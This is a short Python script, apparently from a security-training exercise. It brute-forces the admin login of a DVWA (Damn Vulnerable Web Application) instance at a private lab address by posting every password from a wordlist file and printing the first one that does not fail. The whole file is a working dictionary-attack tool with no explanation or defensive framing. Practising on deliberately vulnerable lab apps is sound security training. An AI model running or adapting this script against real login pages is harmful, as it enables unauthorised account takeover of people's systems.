#!/usr/bin/env python

import requests


target_url = "http://172.16.43.139/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}
with open("passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(url=target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print(f"[+] Password is: {word}")
            exit(0)

print("[-] Password not found")